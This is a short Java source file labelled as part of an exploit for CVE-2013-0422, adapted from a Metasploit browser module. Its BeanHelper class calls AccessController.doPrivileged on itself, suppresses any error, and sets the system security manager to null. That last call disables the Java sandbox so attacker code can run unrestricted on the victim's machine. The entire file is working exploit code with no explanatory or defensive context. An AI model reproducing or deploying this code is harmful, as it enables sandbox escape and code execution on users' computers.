/*
 * (c) 2012 Strategic Cyber LLC
 *
 * See http://www.advancedpentest.com/license
 *
 * Exploit for CVE-2013-0422
 *
 * Metasploit Framework module: multi/browser/java_jre17_jmxbean
 *
 * Adapted from the BSD licensed Metasploit Framework at:
 * /opt/metasploit/msf3/external/source/exploits/cve-2013-0422
 */
import java.security.AccessController;
import java.security.PrivilegedExceptionAction;

public class BeanHelper implements PrivilegedExceptionAction {
	public BeanHelper() {
		try {
			AccessController.doPrivileged(this);
		}
		catch (Throwable ex) {
		}
	}

	public Object run() {
		System.setSecurityManager(null);
		return "";
	}
}
